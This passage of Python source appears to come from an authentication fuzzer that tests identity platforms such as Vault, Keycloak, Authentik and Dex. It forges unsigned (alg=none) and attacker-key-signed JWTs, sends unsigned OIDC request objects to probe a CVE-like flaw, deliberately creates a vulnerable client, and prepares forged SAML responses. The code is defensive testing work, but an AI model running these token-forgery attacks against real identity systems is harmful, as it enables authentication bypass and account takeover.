                    logger.warning(f"    AUTHENTIK: OIDC source redirect login failed: {e}")

        # with per-user identity instead of service-account fallback.
        if (_is_authentik and event.event_type == "create_user"
                and resp.ok and isinstance(response_body, dict)):
            _user_pk = response_body.get("pk")
            _username = response_body.get("username") or resolved_params.get("username", "")
            if _user_pk and _username:
                try:
                    _admin_headers = dict(headers)
                    _ah = self.profile.admin_auth.get("header", "Authorization")
                    _av = self.profile.admin_auth.get("value", "")
                    if "{admin_token}" in _av:
                        _av = self._resolve_admin_token(_av)
                    _admin_headers[_ah] = _av
                    _admin_headers["Content-Type"] = "application/json"
                    import json as _json
                    _tok_identifier = f"valence-{_username}-{_user_pk}"
                    _tok_resp = self.session.post(
                        f"{self.base_url}/api/v3/core/tokens/",
                        headers=_admin_headers,
                        json={"identifier": _tok_identifier,
                              "user": _user_pk,
                              "intent": "app_password",
                              "description": "fuzzer ROPC"},
                        timeout=10)
                    # Handle "already exists": delete old token and retry
                    if _tok_resp.status_code in (400, 409):
                        self.session.delete(
                            f"{self.base_url}/api/v3/core/tokens/{_tok_identifier}/",
                            headers=_admin_headers, timeout=5)
                        _tok_resp = self.session.post(
                            f"{self.base_url}/api/v3/core/tokens/",
                            headers=_admin_headers,
                            json={"identifier": _tok_identifier,
                                  "user": _user_pk,
                                  "intent": "app_password",
                                  "description": "fuzzer ROPC"},
                            timeout=10)
                    if _tok_resp.ok:
                        _tok_id = _tok_resp.json().get("identifier", "")
                        _key_resp = self.session.get(
                            f"{self.base_url}/api/v3/core/tokens/{_tok_id}/view_key/",
                            headers=_admin_headers, timeout=10)
                        if _key_resp.ok:
                            _app_pw = _key_resp.json().get("key", "")
                            if _app_pw:
                                if not hasattr(self, '_ak_app_passwords'):
                                    self._ak_app_passwords = {}
                                self._ak_app_passwords[_username] = _app_pw
                                logger.info(f"    AUTHENTIK: provisioned app-password for {_username}")
                except Exception as e:
                    logger.warning(f"    AUTHENTIK: app-password provisioning failed: {e}")

        # for later login_with_password / token_exchange auto-resolution.
        if (_is_authentik and event.event_type == "create_organization"
                and resp.ok and isinstance(response_body, dict)):
            _ak_cid = response_body.get("client_id", "")
            _ak_cs = response_body.get("client_secret", "")
            if _ak_cid:
                self.captures["client_id"] = _ak_cid
                self.captures["client_secret"] = _ak_cs
                self.captures["provider_client_id"] = _ak_cid
                self.captures["provider_client_secret"] = _ak_cs
                logger.info(f"    AUTHENTIK: captured client_id={_ak_cid[:20]}... from create_organization")

        # Extract user_id from Location and inject into response_body so captures work.
        if event.event_type == "create_user" and resp.status_code == 201:
            location = resp.headers.get("Location", "")
            if location and "/" in location:
                user_id_from_location = location.rstrip("/").rsplit("/", 1)[-1]
                if user_id_from_location and len(user_id_from_location) > 8:
                    if isinstance(response_body, dict):
                        response_body["user_id"] = user_id_from_location
                        response_body["id"] = user_id_from_location
                    self.captures["user_id"] = user_id_from_location
                    logger.info(f"    CREATE_USER: extracted user_id from Location header: {user_id_from_location}")

        # Debug logging for verify events
        if event.event_type.startswith("verify_"):
            logger.info(f"    VERIFY response status={resp.status_code}, body_keys={list(response_body.keys()) if isinstance(response_body, dict) else 'N/A'}")
            if isinstance(response_body, dict) and "data" in response_body and isinstance(response_body["data"], dict):
                logger.info(f"    VERIFY data keys: {list(response_body['data'].keys())}")

        # Extract response fields using response_map and store to captures
        if resp.ok and endpoint.response_map:
            for abstract_field, json_path in endpoint.response_map.items():
                val = self._extract_json_path(response_body, json_path)
                if val is not None:
                    self.captures[abstract_field] = val
                    # Auto-parse URL query params so LLM can reference them
                    # e.g. auth_url → auth_url_authRequestID, auth_url_userAgentID
                    if isinstance(val, str) and "?" in val and ("url" in abstract_field.lower() or abstract_field == "auth_url"):
                        from urllib.parse import urlparse as _up, parse_qs as _pq
                        for _qk, _qv in _pq(_up(val).query).items():
                            self.captures[f"{abstract_field}_{_qk}"] = _qv[0] if _qv else ""

        success = 200 <= resp.status_code < 400
        # Detect application-level errors from the response body.
        if success and isinstance(response_body, dict):
            body_status = response_body.get("status", "")
            if body_status == "error":
                success = False

        # The SAML spec encodes failures in the SAML StatusCode inside the
        # response body.  If the login event got HTTP 200 but no session_token
        # was extracted, treat it as a failed login so the oracle doesn't
        # misclassify SAML error responses as successful authentication.
        if (success
                and event.event_type == "saml_login"
                and resp.status_code == 200
                and endpoint and endpoint.response_map):
            _st_path = endpoint.response_map.get("session_token", "")
            _st_val = self._extract_json_path(response_body, _st_path) if _st_path else None
            # Also check if the raw response contains a SAML error StatusCode
            _raw = resp.text[:2000] if hasattr(resp, 'text') else ""
            _has_saml_error = (
                "StatusCode" in _raw
                and "urn:oasis:names:tc:SAML:2.0:status:Success" not in _raw
            )
            if _st_val is None and (_has_saml_error or not _saml_assertion_accepted):
                success = False
                logger.info(f"    SAML-ORACLE: HTTP 200 but no session_token and SAML error detected → marking as FAILED")
        error_detail = ""
        if not success:
            if isinstance(response_body, dict):
                error_detail = response_body.get("msg", "") or response_body.get("errors", "") or resp.text[:200]
            else:
                error_detail = resp.text[:200]
            logger.info(f"    HTTP RESULT: {resp.status_code} error={str(error_detail)[:200]}")
        return EventResult(
            event=event,
            http_status=resp.status_code,
            response_body=response_body,
            success=success,
            error=str(error_detail),
        )

    def _read_modify_write(self, read_path: str, resolved_params: dict, endpoint) -> Optional[dict]:
        """For APIs that require full object updates, GET the current state,
        merge the requested changes, then POST the full object."""
        # Build entity identifier from owner/name, or use explicit *_id param
        owner = resolved_params.get("owner", "")
        name = resolved_params.get("name", "")
        entity_id = ""
        if owner and name:
            entity_id = f"{owner}/{name}"
        else:
            # Fallback: look for explicit ID params (e.g. application_id, role_id)
            for key in ("application_id", "role_id", "group_id", "permission_id", "provider_id", "model_id", "enforcer_id", "adapter_id"):
                if key in resolved_params and resolved_params[key]:
                    entity_id = str(resolved_params[key])
                    break
        if not entity_id:
            logger.warning("read_before_write: missing owner/name or explicit ID in params")
            return None
        read_url = f"{self.base_url}{read_path}"

        try:
            # Use admin auth for the GET request.
            # Header-auth platforms: resolve {admin_token} template.
            uses_cookie_auth = getattr(self.profile, 'session_auth_method', 'bearer') == 'cookie'
            headers = {}
            if uses_cookie_auth:
                self._ensure_admin_session()
            elif self.profile and self.profile.admin_auth:
                hdr = self.profile.admin_auth.get("header", "")
                val = self.profile.admin_auth.get("value", "")
                if hdr and val:
                    if "{admin_token}" in val:
                        val = self._resolve_admin_token(val)
                    headers[hdr] = val

            resp = self.session.get(read_url, params={"id": entity_id},
                                    headers=headers, timeout=10)
            if not resp.ok:
                logger.warning(f"read_before_write: GET {read_url}?id={entity_id} returned {resp.status_code}")
                return None
            resp_json = resp.json()
            if isinstance(resp_json, dict) and resp_json.get("status") == "error":
                logger.warning(f"read_before_write: GET {read_url}?id={entity_id} error: {resp_json.get('msg', '')}")
                return None

            current = resp_json.get("data", {})
            if not current or not isinstance(current, dict):
                logger.warning(f"read_before_write: empty or non-dict data from GET {read_url}")
                return None

            # Merge requested changes into the current object.
            # For body_map entries that wrap changes in an object (e.g.
            # application_object, role_object), expand the nested dict into
            # the top-level current object.
            merged_count = 0
            for key, value in resolved_params.items():
                if value is None:
                    continue
                # If the value is a dict and the key ends with _object / _body,
                # merge its contents directly into current (deep patch).
                if isinstance(value, dict) and (key.endswith("_object") or key.endswith("_body")):
                    for sub_key, sub_val in value.items():
                        if sub_val is not None:
                            current[sub_key] = sub_val
                            merged_count += 1
                elif key in current:
                    current[key] = value
                    merged_count += 1

            logger.info(f"    READ-MODIFY-WRITE: merged {merged_count} fields into object from {read_path}")
            return current

        except Exception as e:
            logger.warning(f"read_before_write: error fetching {read_url}: {e}")
            return None

    def _get_or_create_key_pem(self, hint: str) -> str:
        """Get or create a key pair for the given hint label, return PEM public key.

        This enables key rotation and attacker-key testing:
        - "default" → campaign's trusted key (always pre-registered)
        - "key-A", "key-B", "attacker" → lazily generated distinct keys
        """
        if hint not in self._key_registry:
            from src.utils.crypto import generate_rsa_key_pair
            from cryptography.hazmat.primitives import serialization
            priv, pub = generate_rsa_key_pair()
            pub_pem = pub.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode()
            self._key_registry[hint] = (priv, pub_pem)
            logger.info(f"    KEY-REGISTRY: generated new key pair for hint='{hint}'")
        return self._key_registry[hint][1]

    def _get_signing_key(self, hint: str):
        """Get the private signing key for a hint label (creates if needed)."""
        self._get_or_create_key_pem(hint)  # ensure key exists
        return self._key_registry[hint][0]

    def _resolve_jwt_claim_templates(self, jwt_claims: dict) -> dict:
        return resolve_jwt_claim_templates(jwt_claims)

    def _execute_login(self, event: Event, resolved_params: dict) -> EventResult:
        """Execute a login event via JWTFactory + BrokerAdapter (Sprint 1 component)."""
        from src.models.types import Credential, Protocol

        jwt_claims = resolved_params.get("jwt_claims", {})
        role = resolved_params.get("role", "test-role")
        mount = resolved_params.get("mount", "jwt")

        if self.jwt_factory is None:
            return EventResult(event=event, error="jwt_factory not configured")

        jwt_claims = self._resolve_jwt_claim_templates(jwt_claims)

        # Support alg=none and key hint attacks (same logic as _execute_profile_login)
        _key_hint = jwt_claims.pop("_signing_key_hint", None)
        _requested_alg = str(jwt_claims.get("alg", "")).lower()
        if _requested_alg == "none":
            jwt_claims.pop("alg", None)
            jwt_token = self.jwt_factory.create_unsigned_token(jwt_claims)
        elif _key_hint and _key_hint != "default":
            jwt_token = self.jwt_factory.create_token(
                jwt_claims, signing_key=self._get_signing_key(_key_hint))
        else:
            jwt_token = self.jwt_factory.create_token(jwt_claims)

        credential = Credential(
            protocol=Protocol.JWT,
            raw_token=jwt_token,
            claims=jwt_claims,
            metadata={"role": role, "mount": mount},
        )

        auth_result = self.adapter.authenticate(credential)

        if auth_result.success:
            response_body = {
                "auth": {
                    "client_token": auth_result.downstream_token,
                    "entity_id": auth_result.downstream_claims.get("entity_id", ""),
                    "policies": auth_result.downstream_claims.get("policies", []),
                    "metadata": auth_result.downstream_claims.get("metadata", {}),
                    "accessor": auth_result.downstream_claims.get("accessor", ""),
                }
            }
        else:
            response_body = {"errors": [auth_result.error_message or "login failed"]}

        # Run syntactic oracles (Sprint 3) on successful login
        if auth_result.success and self.oracles:
            self._run_syntactic_oracles(event, credential, auth_result, jwt_claims)

        return EventResult(
            event=event,
            http_status=auth_result.http_status,
            response_body=response_body,
            success=auth_result.success,
            error="" if auth_result.success else (auth_result.error_message or ""),
        )

    def _execute_profile_login(self, event: Event, endpoint, resolved_params: dict) -> EventResult:
        """Profile mode login: build JWT, send via profile endpoint, get real response.

        Unlike _execute_login (which uses adapter and reconstructs response_body),
        this sends the actual HTTP request and returns the REAL platform response.
        This ensures response_map extraction works correctly for any platform.
        """
        from src.models.types import Credential, Protocol, MutationRecord

        jwt_claims = resolved_params.get("jwt_claims", {})
        role = resolved_params.get("role", "test-role")
        mount = resolved_params.get("mount", "jwt")

        if self.jwt_factory is None:
            return EventResult(event=event, error="jwt_factory not configured")

        jwt_claims = self._resolve_jwt_claim_templates(jwt_claims)

        # "failed to fetch groups" errors when roles set groups_claim
        if "groups" not in jwt_claims:
            jwt_claims["groups"] = ["default"]

        # is absent. An iat far in the future causes "token not yet valid" 400s.
        # If iat is a concrete integer > now+60s (not a deliberate future claim),
        # cap it to now so the JWT is always immediately valid.
        import time as _time
        _now = int(_time.time())
        if isinstance(jwt_claims.get("iat"), (int, float)) and jwt_claims["iat"] > _now + 60:
            logger.info(f"    JWT: capping future iat={jwt_claims['iat']} → {_now}")
            jwt_claims["iat"] = _now

        # Extract attack-control metadata from claims before logging/signing.
        # _signing_key_hint: selects which key to sign with (must match configure_jwt_validation hint)
        # alg=none in claims: produce an unsigned JWT (real alg=none attack)
        _key_hint = jwt_claims.pop("_signing_key_hint", None)
        _requested_alg = str(jwt_claims.get("alg", "")).lower()

        logger.info(f"    JWT claims: {jwt_claims}")

        # Build JWT — dispatch based on attack type
        if _requested_alg == "none":
            # Real alg=none attack: produce unsigned JWT (header alg=none, no signature)
            jwt_claims.pop("alg", None)  # alg goes in header, not payload
            jwt_token = self.jwt_factory.create_unsigned_token(jwt_claims)
            logger.info(f"    JWT: produced UNSIGNED token (alg=none attack)")
        elif _key_hint and _key_hint != "default":
            # Sign with a specific key (e.g. attacker key, rotated-out key)
            _signing_key = self._get_signing_key(_key_hint)
            jwt_token = self.jwt_factory.create_token(jwt_claims, signing_key=_signing_key)
            logger.info(f"    JWT: signed with key hint='{_key_hint}'")
        else:
            # Default: sign with trusted campaign key
            jwt_token = self.jwt_factory.create_token(jwt_claims)

        # Replace abstract params with actual values for HTTP call
        login_params = dict(resolved_params)
        login_params["token"] = jwt_token
        login_params["role"] = role
        login_params["mount"] = mount

        # Use generic profile HTTP executor — gets REAL response from platform
        result = self._execute_profile_http(event, endpoint, login_params)

        # Auto-recover from "audience claim found in JWT but no audiences bound to the role":
        # the LLM sometimes omits audience_restriction on the role while keeping aud in the JWT.
        # Safe fallback: retry without aud so the login can at least succeed.
        if (not result.success
                and result.http_status == 400
                and "aud" in jwt_claims
                and "audience claim found in JWT but no audiences bound" in str(result.error)):
            logger.info("    JWT: role has no bound_audiences but JWT has aud — retrying without aud claim")
            jwt_claims_no_aud = {k: v for k, v in jwt_claims.items() if k != "aud"}
            jwt_token_no_aud = self.jwt_factory.create_token(jwt_claims_no_aud)
            login_params_no_aud = dict(login_params)
            login_params_no_aud["token"] = jwt_token_no_aud
            result = self._execute_profile_http(event, endpoint, login_params_no_aud)
            if result.success:
                logger.info("    JWT: retry without aud succeeded")
                jwt_claims = jwt_claims_no_aud
                jwt_token = jwt_token_no_aud

        # Run syntactic oracles on successful login (Sprint 3 layer)
        if result.success and self.oracles:
            credential = Credential(
                protocol=Protocol.JWT,
                raw_token=jwt_token,
                claims=jwt_claims,
                metadata={"role": role, "mount": mount},
            )

            from src.models.types import AuthResult as AR, Platform

            # Extract token from response using profile's response_map
            session_token = ""
            if endpoint.response_map:
                token_path = endpoint.response_map.get("session_token", "")
                if token_path:
                    session_token = self._extract_json_path(result.response_body, token_path) or ""

            # Resolve platform enum from profile name
            try:
                platform_enum = Platform(self.profile.name if self.profile else "vault")
            except ValueError:
                platform_enum = Platform.VAULT

            auth_result = AR(
                success=True,
                platform=platform_enum,
                protocol=Protocol.JWT,
                http_status=result.http_status,
                downstream_token=session_token,
                downstream_claims=result.response_body.get("auth", result.response_body),
                raw_response=result.response_body if isinstance(result.response_body, dict) else {},
            )
            self._run_syntactic_oracles(event, credential, auth_result, jwt_claims)

        return result

    def _execute_test_request_object(self, event: Event) -> EventResult:
        """Test OIDC request object handling by sending a JWT with alg=none.

        This is a generic capability for testing CVE-like vulnerabilities where
        the authorization endpoint accepts unsigned request objects.

        Event params:
          - realm: KC realm name
          - client_id: OIDC client ID
          - redirect_uri: Callback URL
          - scope: e.g. "openid"
          - response_type: e.g. "code"
          - request_object_alg: "none" (default) or other algorithm
          - request_object_claims: Additional claims to embed in the JWT
        """
        import base64 as _b64

        resolved_params = self._resolve_params(event.params)
        realm = resolved_params.get("realm", "valence-test")
        client_id = resolved_params.get("client_id", "test-client")
        redirect_uri = resolved_params.get(
            "redirect_uri",
            f"{self.base_url}/realms/{realm}/account/"
        )
        scope = resolved_params.get("scope", "openid")
        response_type = resolved_params.get("response_type", "code")
        alg = resolved_params.get("request_object_alg", "none")

        # Build the request object JWT
        header = json.dumps({"alg": alg, "typ": "JWT"}).encode()
        payload_dict = {
            "client_id": client_id,
            "response_type": response_type,
            "redirect_uri": redirect_uri,
            "scope": scope,
        }
        # Merge any additional claims
        extra = resolved_params.get("request_object_claims", {})
        if isinstance(extra, dict):
            payload_dict.update(extra)
        payload = json.dumps(payload_dict).encode()

        def _b64url(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

        if alg == "none":
            # Unsigned JWT: header.payload. (empty signature)
            request_jwt = f"{_b64url(header)}.{_b64url(payload)}."
        else:
            # For signed algorithms, use jwt_factory if available
            if self.jwt_factory:
                request_jwt = self.jwt_factory.create_token(payload_dict)
            else:
                request_jwt = f"{_b64url(header)}.{_b64url(payload)}."

        # Auto-create the client if it doesn't exist (POC self-contained setup).
        # This avoids needing a separate create_client event in the api_mapping.
        try:
            auth_header = self.profile.admin_auth.get("header", "Authorization")
            auth_value = self.profile.admin_auth.get("value", "")
            if "{admin_token}" in auth_value:
                auth_value = self._resolve_admin_token(auth_value)
            admin_h = {auth_header: auth_value, "Content-Type": "application/json"}
            # Ensure realm is enabled (some create_tenant events omit enabled=true)
            realm_resp = self.session.get(
                f"{self.base_url}/admin/realms/{realm}", headers=admin_h, timeout=10)
            if realm_resp.ok:
                realm_data = realm_resp.json()
                if not realm_data.get("enabled", True):
                    realm_data["enabled"] = True
                    self.session.put(
                        f"{self.base_url}/admin/realms/{realm}",
                        headers=admin_h, json=realm_data, timeout=10)
                    logger.info(f"    REQUEST-OBJECT: enabled realm '{realm}'")

            _client_resp = self.session.get(
                f"{self.base_url}/admin/realms/{realm}/clients",
                params={"clientId": client_id}, headers=admin_h, timeout=10,
            )
            if not _client_resp.ok:
                raise RuntimeError(f"client list query returned {_client_resp.status_code}")
            existing = _client_resp.json()
            if not existing:
                client_body = {
                    "clientId": client_id, "publicClient": True, "enabled": True,
                    "redirectUris": [redirect_uri, redirect_uri + "*"],
                    "standardFlowEnabled": True, "directAccessGrantsEnabled": False,
                    # NOTE: NO requestObjectSignatureAlg — this IS the vulnerability condition
                }
                self.session.post(
                    f"{self.base_url}/admin/realms/{realm}/clients",
                    headers=admin_h, json=client_body, timeout=10,
                )
                logger.info(f"    REQUEST-OBJECT: auto-created public client '{client_id}'")
        except Exception as e:
            logger.warning(f"    REQUEST-OBJECT: client setup failed: {e}")

        # Send to authorization endpoint
        auth_url = f"{self.base_url}/realms/{realm}/protocol/openid-connect/auth"
        params = {
            "client_id": client_id,
            "response_type": response_type,
            "scope": scope,
            "redirect_uri": redirect_uri,
            "request": request_jwt,
        }
        logger.info(
            f"    REQUEST-OBJECT: GET {auth_url} alg={alg} "
            f"client_id={client_id} jwt_len={len(request_jwt)}"
        )

        try:
            resp = self.session.get(
                auth_url, params=params, allow_redirects=False, timeout=15,
            )
        except Exception as e:
            return EventResult(event=event, error=str(e))

        # Parse response
        status = resp.status_code
        location = resp.headers.get("Location", "")
        body_text = resp.text[:1000]

        # Determine if the auth endpoint accepted the request object
        # Accepted: 302/303 redirect to login page, or 200 with login UI
        # Rejected: 400 with error message containing "verify"/"signature"/"invalid"
        is_login_redirect = (
            status in (302, 303)
            and ("login" in location.lower() or "/auth/" in location)
        )
        is_login_page = (
            status == 200
            and ("login" in body_text.lower() or "sign in" in body_text.lower())
        )
        is_rejected = (
            status == 400
            and any(w in body_text.lower()
                    for w in ("verify", "signature", "invalid", "error"))
        )

        accepted = is_login_redirect or is_login_page
        response_body = {
            "accepted": accepted,
            "rejected": is_rejected,
            "http_status": status,
            "location": location[:200],
            "error_text": body_text[:200] if is_rejected else "",
        }

        logger.info(
            f"    REQUEST-OBJECT: status={status} accepted={accepted} "
            f"rejected={is_rejected} location={location[:80]}"
        )

        # Apply event-level captures (this event short-circuits before generic capture)
        captured = {}
        for var_name, json_path in event.captures.items():
            if json_path == "http_status" or json_path == "_http_status":
                value = status
            else:
                value = self._extract_json_path(response_body, json_path)
            captured[var_name] = value
            self.captures[var_name] = value

        result = EventResult(
            event=event,
            http_status=status,
            response_body=response_body,
            success=accepted,
            error="" if not is_rejected else body_text[:200],
        )
        result.captured_values = captured
        return result

    def _execute_raw_http(self, event: Event, reg: dict, resolved_params: dict) -> EventResult:
        """Legacy mode: execute a non-login event via raw HTTP (setup and verify events)."""
        token = self._get_token(event.auth_as, reg["auth"])
        method = reg["method"]
        path = reg["path"]

        # Separate path vs body params
        path_params = {}
        body_params = {}
        for key, value in resolved_params.items():
            schema = reg["params_schema"].get(key, {})
            if schema.get("in") == "path":
                path_params[key] = value
            else:
                body_params[key] = value

        # Format path
        for k, v in path_params.items():
            path = path.replace(f"{{{k}}}", str(v))

        # Special: setup_secret — wrap data in {"data": ...}
        if event.event_type == "setup_secret" and "data" in body_params:
            body_params = {"data": body_params["data"]}

        headers = {"Content-Type": "application/json"}
        if token:
            headers["X-Vault-Token"] = token

        url = f"{self.base_url}{path}"
        if method == "LIST":
            resp = self.session.request("LIST", url, headers=headers, json=body_params or None)
        elif method in ("POST", "PUT"):
            resp = self.session.request(method, url, headers=headers, json=body_params)
        elif method == "GET":
            resp = self.session.get(url, headers=headers)
        elif method == "DELETE":
            resp = self.session.delete(url, headers=headers)
        elif method == "PATCH":
            resp = self.session.patch(url, headers=headers, json=body)
        else:
            return EventResult(event=event, error=f"Unsupported method: {method}")

        try:
            response_body = resp.json()
        except Exception:
            response_body = {"raw": resp.text[:500]}

        success = 200 <= resp.status_code < 400
        return EventResult(
            event=event,
            http_status=resp.status_code,
            response_body=response_body,
            success=success,
            error="" if success else str(response_body.get("errors", resp.text[:200])),
        )

    def _run_syntactic_oracles(self, event: Event, credential, auth_result, jwt_claims: dict):
        """Run Sprint 3 syntactic oracles on a successful login result.

        Results accumulate in self.syntactic_verdicts; only VIOLATION/UNEXPECTED kept.
        """
        from src.models.types import MutationRecord

        mutation_type = event.params.get("mutation_type", "stateful_login")

        mutation = MutationRecord(
            mutation_type=mutation_type,
            description=f"Stateful login: {event.auth_as}",
            metadata={
                "jwt_claims": jwt_claims,
                "stateful": True,
                "auth_as": event.auth_as,
                "config_change": event.params.get("config_change", {}),
            },
            credential=credential,
        )

        # Build role_config from captures — oracle precondition checks
        # (bound_issuer, bound_claims_type, groups_claim) need this.
        role_config = {}
        for key, val in self.captures.items():
            if val is not None and any(
                key.endswith(f"_{field}") or key == field
                for field in ("bound_issuer", "bound_audiences", "bound_claims_type",
                              "bound_claims", "groups_claim", "user_claim",
                              "token_policies", "claim_constraints", "claim_constraint_type")
            ):
                # Use the shortest matching field name
                for field in ("bound_issuer", "bound_audiences", "bound_claims_type",
                              "bound_claims", "groups_claim", "user_claim",
                              "token_policies", "claim_constraints", "claim_constraint_type"):
                    if key.endswith(field) or key == field:
                        role_config[field] = val
                        break

        context = {
            "auth_context": "JWT_BEARER",
            "platform_config": {"base_url": self.base_url},
            "role_config": role_config,
        }

        for inv_name, oracle in self.oracles.items():
            try:
                verdict = oracle.check(mutation, auth_result, context)
                if verdict.verdict_type.value in ("VIOLATION", "UNEXPECTED"):
                    self.syntactic_verdicts.append(verdict)
            except Exception as e:
                logger.debug(f"Oracle {inv_name} error (non-fatal): {e}")

    # ------------------------------------------------------------------
    # Brokered login form auto-submit
    # ------------------------------------------------------------------

    def _auto_submit_broker_form(self, resp, http_session,
                               login_params: dict = None) -> "requests.Response":
        """Auto-submit HTML forms from brokered login flows.

        Many SPs (KC first-broker-login, consent pages, profile review) return
        an HTML page with a form that the user must submit to continue the auth
        flow.  This method parses the form, extracts action URL + hidden fields,
        populates empty fields from login_params (SAML assertion attributes),
        and submits it.

        Returns the final response (may be a redirect with auth code, or
        the last page in the chain).
        """
        from urllib.parse import urljoin

        html = resp.text
        login_params = login_params or {}
        max_forms = 3  # safety limit for chained forms

        for _form_attempt in range(max_forms):
            # Extract form action and fields
            action_match = re.search(
                r'<form[^>]*action="([^"]*)"[^>]*>', html,
            )
            if not action_match:
                break
            action = action_match.group(1).replace("&amp;", "&")
            if not action.startswith("http"):
                action = urljoin(resp.url or f"{self.base_url}/", action)

            # Extract all input fields — handle both attribute orderings:
            # <input name="x" value="y"> and <input value="y" name="x">
            fields = {}
            for inp_match in re.finditer(r'<input[^>]*>', html):
                inp = inp_match.group(0)
                name_m = re.search(r'name="([^"]*)"', inp)
                value_m = re.search(r'value="([^"]*)"', inp)
                if name_m:
                    fields[name_m.group(1)] = (
                        value_m.group(1).replace("&amp;", "&")
                        if value_m else ""
                    )

            # Fill empty form fields from login params (SAML assertion attributes).
            _target = login_params.get("target_identity", login_params.get("username", ""))
            _email = login_params.get("email", "")
            _fill_map = {
                "username": _target,
                "email": _email or (f"{_target}@test.local" if _target else ""),
                "firstName": login_params.get("firstName", (_target or "Test")),
                "lastName": login_params.get("lastName", "User"),
            }
            for field_name, fallback_value in _fill_map.items():
                if field_name in fields and not fields[field_name] and fallback_value:
                    fields[field_name] = fallback_value

            # Detect form method
            method_match = re.search(r'<form[^>]*method="([^"]*)"', html, re.I)
            form_method = (method_match.group(1).upper() if method_match else "POST")

            logger.info(
                f"    BROKER-FORM: auto-submit #{_form_attempt + 1} → "
                f"{form_method} {action} fields={list(fields.keys())}"
            )

            # Submit the form — follow redirects to see where we end up
            if form_method == "GET":
                resp = http_session.get(action, params=fields, allow_redirects=True)
            else:
                resp = http_session.post(action, data=fields, allow_redirects=True)

            # Check if the result is another HTML form (chained consent/review)
            is_html = 'text/html' in resp.headers.get('Content-Type', '')
            if is_html and '<form' in resp.text:
                html = resp.text
                continue  # Submit the next form

            # Not a form — we're done. Check for auth code in the final URL.
            if resp.url:
                from urllib.parse import urlparse, parse_qs
                qs = parse_qs(urlparse(resp.url).query)
                code = qs.get("code", [None])[0]
                if code:
                    logger.info(
                        f"    BROKER-FORM: extracted auth code "
                        f"{code[:20]}... from final URL"
                    )
                    # Synthesize a JSON response for downstream token extraction
                    resp._content = json.dumps({
                        "auth_code": code,
                        "session_token": code,
                    }).encode()
                    resp.headers["Content-Type"] = "application/json"
                    resp.status_code = 200
            break

        return resp

    # ------------------------------------------------------------------
    # Token resolution
    # ------------------------------------------------------------------

    def _get_token(self, auth_as: str, registry_auth: str) -> Optional[str]:
        """Resolve which token to use for a legacy-mode request."""
        if registry_auth == "none" or auth_as == "none":
            return None
        if auth_as == "admin" or registry_auth == "admin":
            return self.admin_token
        if auth_as.startswith("session_"):
            return self.tokens.get(auth_as, "")
        return self.tokens.get(f"session_{auth_as}", "")

    def _kc_initiate_saml_flow(self, realm: str, idp_alias: str) -> tuple:
        """Initiate a KC SP-initiated SAML flow using curl.

        Python's requests library won't send Secure cookies over HTTP.
        curl is more lenient and works correctly with KC's Secure-flagged cookies.

        Stores auth session cookies in self.captures['_kc_saml_cookies'] so the
        SAMLResponse POST can include them (KC requires cookies to look up the session).

        Returns (authn_request_id, relay_state) — relay_state is mandatory for KC.
        """
        import subprocess
        import tempfile
        import os
        import re as _re

        auth_url = (
            f"{self.base_url}/realms/{realm}/protocol/openid-connect/auth"
            f"?client_id=account"
            f"&redirect_uri={self.base_url}/realms/{realm}/account/"
            f"&response_type=code&scope=openid&kc_idp_hint={idp_alias}"
        )
        try:
            with tempfile.NamedTemporaryFile(suffix='.cookies', delete=False) as tf:
                cookie_file = tf.name
            try:
                # Follow redirects; stop at mock-idp URL (connection refused is OK —
                # we get the Location header before curl tries to connect).
                result = subprocess.run(
                    [
                        'curl', '--no-progress-meter', '-sf',
                        '-c', cookie_file, '-b', cookie_file,
                        '-D', '/dev/stderr',
                        '--max-redirs', '5', '-L',
                        '--write-out', '\nFINAL_URL:%{url_effective}',
                        '-o', '/dev/null',
                        auth_url,
                    ],
                    capture_output=True, text=True, timeout=15,
                )
                # Parse cookies from cookie jar file (Netscape format).
                # HttpOnly cookies are prefixed with "#HttpOnly_" — include them.
                cookies = {}
                try:
                    with open(cookie_file) as cf:
                        for line in cf:
                            line = line.strip()
                            if not line or line.startswith('# Netscape'):
                                continue
                            # Strip HttpOnly prefix so we can parse the rest
                            if line.startswith('#HttpOnly_'):
                                line = line[len('#HttpOnly_'):]
                            if line.startswith('#'):
                                continue
                            parts = line.split('\t')
                            if len(parts) >= 7:
                                cookies[parts[5]] = parts[6]
                except Exception:
                    pass
                if cookies:
                    self.captures['_kc_saml_cookies'] = cookies
                    logger.info(f"    KC-SAML-INIT: captured cookies {list(cookies.keys())}")

                # Headers are in stderr — find any Location: with SAMLRequest
                from urllib.parse import urlparse, parse_qs
                for line in result.stderr.split('\n'):
                    stripped = line.strip()
                    if (stripped.lower().startswith('location:') and
                            'SAMLRequest' in stripped):
                        url = stripped[len('location:'):].strip()
                        parsed = urlparse(url)
                        qs = parse_qs(parsed.query)
                        relay_state = qs.get('RelayState', [None])[0]
                        saml_req_b64 = qs.get('SAMLRequest', [None])[0]
                        authn_id = (self._parse_saml_request_id(saml_req_b64)
                                    if saml_req_b64 else None)
                        return authn_id, relay_state
                # Fallback: check stdout for FINAL_URL
                for line in result.stdout.split('\n'):
                    if line.startswith('FINAL_URL:') and 'SAMLRequest' in line:
                        url = line[len('FINAL_URL:'):].strip()
                        parsed = urlparse(url)
                        qs = parse_qs(parsed.query)
                        relay_state = qs.get('RelayState', [None])[0]
                        saml_req_b64 = qs.get('SAMLRequest', [None])[0]
                        authn_id = (self._parse_saml_request_id(saml_req_b64)
                                    if saml_req_b64 else None)
                        return authn_id, relay_state
            finally:
                try:
                    os.unlink(cookie_file)
                except OSError:
                    pass
        except Exception as e:
            logger.warning(f"    KC-SAML-INIT: error: {e}")
        return None, None

    def _initiate_saml_flow(self, endpoint, resolved_params: dict) -> tuple:
        """Initiate an SP-initiated SAML flow and capture the AuthnRequest ID.

        Returns (authn_request_id, relay_state) tuple. Either may be None.

        Some SPs (e.g. Dex) require that SAML responses include InResponseTo
        matching a prior AuthnRequest. This method:
        1. GETs the SP's auth endpoint to start the SAML flow
        2. Follows the redirect to the IdP SSO URL (which contains a SAMLRequest)
        3. Extracts and decodes the SAMLRequest to get the AuthnRequest ID
        4. Returns the ID for use in the forged SAMLResponse
        """
        import base64
        import zlib
        from urllib.parse import urlparse, parse_qs, urljoin
        from lxml import etree

        try:
            # Use default_params from the profile's OIDC login_with_mock or saml_login
            # to construct the initial auth request URL
            _meta = getattr(endpoint, 'metadata', {}) or {}
            _defaults = getattr(endpoint, 'default_params', {}) or {}

            # Build the initial auth URL from profile metadata or platform defaults
